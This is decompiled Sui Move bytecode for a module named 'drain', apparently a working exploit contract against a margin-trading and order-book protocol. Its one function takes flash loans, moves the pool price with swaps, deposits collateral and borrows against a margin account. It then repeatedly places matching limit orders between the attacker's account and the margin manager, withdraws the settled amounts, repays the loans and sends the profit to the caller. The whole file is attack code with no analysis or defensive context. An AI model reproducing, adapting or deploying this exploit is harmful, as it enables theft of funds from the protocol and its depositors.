module 0x281035c1c61cc416c50a1d18afa3cd905754b4717570025f600e7438fac1cac6::drain {
    public fun execute<T0, T1>(arg0: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::Pool<T0, T1>, arg1: &mut 0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_registry::MarginRegistry, arg2: &mut 0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_manager::MarginManager<T0, T1>, arg3: &mut 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::BalanceManager, arg4: &mut 0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_pool::MarginPool<T1>, arg5: &0x8d97f1cd6ac663735be08d1d2b6d02a159e711586461306ce60a2b7a6a565a9e::price_info::PriceInfoObject, arg6: &0x8d97f1cd6ac663735be08d1d2b6d02a159e711586461306ce60a2b7a6a565a9e::price_info::PriceInfoObject, arg7: u64, arg8: u64, arg9: u64, arg10: u64, arg11: u64, arg12: u64, arg13: u64, arg14: &0x2::clock::Clock, arg15: &mut 0x2::tx_context::TxContext) {
        let (v0, v1) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::borrow_flashloan_base<T0, T1>(arg0, arg7, arg15);
        let v2 = v0;
        let (v3, v4) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::borrow_flashloan_quote<T0, T1>(arg0, arg8, arg15);
        let v5 = v3;
        if (arg9 > 0) {
            let (v6, v7, v8) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::swap_exact_quote_for_base<T0, T1>(arg0, 0x2::coin::split<T1>(&mut v5, arg9, arg15), 0x2::coin::zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(arg15), 0, arg14, arg15);
            0x2::coin::join<T0>(&mut v2, v6);
            0x2::coin::join<T1>(&mut v5, v7);
            0x2::coin::destroy_zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(v8);
        };
        let v9 = arg7 / 5;
        if (v9 > 0) {
            let (v10, v11, v12) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::swap_exact_base_for_quote<T0, T1>(arg0, 0x2::coin::split<T0>(&mut v2, v9, arg15), 0x2::coin::zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(arg15), 0, arg14, arg15);
            0x2::coin::join<T0>(&mut v2, v10);
            0x2::coin::join<T1>(&mut v5, v11);
            0x2::coin::destroy_zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(v12);
        };
        let (_, _, v15, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::get_level2_ticks_from_mid<T0, T1>(arg0, 1, arg14);
        let v17 = v15;
        let (v18, _, _, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::get_level2_ticks_from_mid<T0, T1>(arg0, 1, arg14);
        let v22 = v18;
        let v23 = (*0x1::vector::borrow<u64>(&v17, 0) - arg12) / arg12 * arg12;
        let v24 = (*0x1::vector::borrow<u64>(&v22, 0) + arg12) / arg12 * arg12;
        0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::pool_proxy::update_current_price<T0, T1>(arg1, arg0, arg5, arg6, arg14);
        0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_manager::deposit<T0, T1, T1>(arg2, arg1, arg5, arg6, 0x2::coin::split<T1>(&mut v5, arg10, arg15), arg14, arg15);
        0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::margin_manager::borrow_quote<T0, T1>(arg2, arg1, arg4, arg5, arg6, arg0, arg11, arg14, arg15);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::deposit<T0>(arg3, v2, arg15);
        let (_, v26, _) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::pool_book_params<T0, T1>(arg0);
        let v28 = 0x2::coin::value<T0>(&v2) * 90 / 100 / v26 * v26;
        let v29 = v28 * 999 / 1000 / v26 * v26;
        let v30 = 0;
        while (v30 < arg13) {
            let v31 = v30 * 10;
            let v32 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg15);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::place_limit_order<T0, T1>(arg0, arg3, &v32, v31, 0, 0, v23, v28, false, false, 18446744073709551615, arg14, arg15);
            0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::pool_proxy::place_limit_order<T0, T1>(arg1, arg2, arg0, v31 + 1, 1, 0, v23, v28, true, false, 18446744073709551615, arg14, arg15);
            let v33 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg15);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::cancel_all_orders<T0, T1>(arg0, arg3, &v33, arg14, arg15);
            let v34 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg15);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<T0, T1>(arg0, arg3, &v34);
            let v35 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg15);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::place_limit_order<T0, T1>(arg0, arg3, &v35, v31 + 2, 0, 0, v24, v29, true, false, 18446744073709551615, arg14, arg15);
            0x97d9473771b01f77b0940c589484184b49f6444627ec121314fae6a6d36fb86b::pool_proxy::place_limit_order<T0, T1>(arg1, arg2, arg0, v31 + 3, 1, 0, v24, v29, false, false, 18446744073709551615, arg14, arg15);
            let v36 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg15);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::cancel_all_orders<T0, T1>(arg0, arg3, &v36, arg14, arg15);
            let v37 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg15);
            0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<T0, T1>(arg0, arg3, &v37);
            v30 = v30 + 1;
        };
        let v38 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg15);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::cancel_all_orders<T0, T1>(arg0, arg3, &v38, arg14, arg15);
        let v39 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::generate_proof_as_owner(arg3, arg15);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::withdraw_settled_amounts<T0, T1>(arg0, arg3, &v39);
        let v40 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::withdraw_all<T0>(arg3, arg15);
        let v41 = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::balance_manager::withdraw_all<T1>(arg3, arg15);
        let v42 = 0x2::coin::value<T1>(&v41) / 50;
        if (v42 > 0) {
            let (v43, v44, v45) = 0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::swap_exact_quote_for_base<T0, T1>(arg0, 0x2::coin::split<T1>(&mut v41, v42, arg15), 0x2::coin::zero<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>(arg15), 0, arg14, arg15);
            0x2::coin::join<T0>(&mut v40, v43);
            0x2::coin::join<T1>(&mut v41, v44);
            0x2::transfer::public_transfer<0x2::coin::Coin<0xdeeb7a4662eec9f2f3def03fb937a663dddaa2e215b8078a284d026b7946c270::deep::DEEP>>(v45, 0x2::tx_context::sender(arg15));
        };
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::return_flashloan_base<T0, T1>(arg0, 0x2::coin::split<T0>(&mut v40, arg7, arg15), v1);
        0x2::coin::join<T1>(&mut v41, v5);
        0x2c8d603bc51326b8c13cef9dd07031a408a48dddb541963357661df5d3204809::pool::return_flashloan_quote<T0, T1>(arg0, 0x2::coin::split<T1>(&mut v41, arg8, arg15), v4);
        0x2::transfer::public_transfer<0x2::coin::Coin<T0>>(v40, 0x2::tx_context::sender(arg15));
        0x2::transfer::public_transfer<0x2::coin::Coin<T1>>(v41, 0x2::tx_context::sender(arg15));
    }

    // decompiled from Move bytecode v7
}

